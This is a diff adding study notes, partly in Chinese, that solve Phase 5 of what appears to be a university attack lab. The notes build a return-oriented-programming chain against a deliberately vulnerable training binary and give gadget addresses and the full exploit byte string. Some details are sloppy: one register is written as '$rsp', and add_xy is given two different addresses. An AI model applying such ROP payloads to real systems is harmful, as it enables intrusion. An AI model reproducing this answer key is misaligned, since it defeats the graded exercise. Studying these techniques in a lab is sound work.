@@ -1,0 +1,87 @@
+----------------------------------------------------------------------------
+rt2:
+----------------------------------------------------------------------------
+Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string
+representation of your cookie. That may not seem significantly more difficult than using an ROP attack to
+invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a
+true measure of the effort it will require. Think of it as more an extra credit problem for those who want to
+go beyond the normal expectations for the course.
+To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions
+start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes
+the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the
+farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or
+memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on
+the low-order bytes of some of the registers but do not change their values.
+
+Some Advice:
+• You’ll want to review the effect a movl instruction has on the upper 4 bytes of a register, as is
+described on page 183 of the text.
+• The official solution requires eight gadgets (not all of which are unique).
+
+----------------------------------------------------------------------------
+阶段五是用ROP攻击去攻击rtarget，从而成功调用touch3()函数
+然后阶段五和阶段三的重要区别就是阶段五使用了栈随机。意味着栈顶的地址每次是变化的。
+rt3:
+ 把cookie字符串转为ASCLL码 -> 将字符串放在(在成功调用touch3()里面比较指令前都不会被修改的)内存中 -> 把字符串的内容地址放在rdi寄存器中 -> 成功调用touch3()函数
+
+<第一个返回地址>：<mov $<字符串地址>,%rdi , ret>
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<第一个返回地址>
+<touch3()函数地址>
+<字符串地址>:35 39 62 39 39 37 66 61
+----------------------------------------------------------------------------
+ct3的字符串地址不会发生改变，而rt2会！
+缓冲区的起始地址一直在变化，所以不能将 cookie 字符串的地址直接写入缓冲区。但是 %rsp 里面存储了地址，如果我们给这个地址加上一个偏差量，就能得到 cookie 字符串的地址了。
+
+movq $rsp, %rdi
+popq %rsi
+callq 0x401d6<add_xy>
+movq %rax, %rdi
+
+----------------------------------------------------------------------------
+因为以上指令不都是直白的存在于start_farm 到 end_farm 之间的gadget，所以绕路
+
+movq %rsp, %rax
+movq %rax, %rdi
+popq %rax
+movl %eax, %edx
+movl %edx, %ecx
+movl %ecx, %esi
+callq 0x4019d6<add_xy>
+movq $rsp, %rdi
+
+可得
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+06 1a 40 00 00 00 00 00     /* addval_190: movq %rsp, %rax */
+a2 19 40 00 00 00 00 00     /* addval_273: movq %rax, %rdi */
+ab 19 40 00 00 00 00 00     /* addval_219: popq %rax */
+48 00 00 00 00 00 00 00     /* 偏移地址 */
+dd 19 40 00 00 00 00 00     /* getval_481: movl %eax, %edx */
+69 1a 40 00 00 00 00 00     /* getval_311: movl %edx, %ecx */
+13 1a 40 00 00 00 00 00     /* addval_436: movl %ecx, %esi */
+d6 19 40 00 00 00 00 00     /* <add_xy> */
+c5 19 40 00 00 00 00 00     /* setval_426: movq %rsp, %rdi */
+fa 18 40 00 00 00 00 00     /* touch3 地址 */
+35 39 62 39 39 37 66 61 00  /* cookie: 0x59b997fa */
+----------------------------------------------------------------------------
+rt2:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+69 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+----------------------------------------------------------------------------
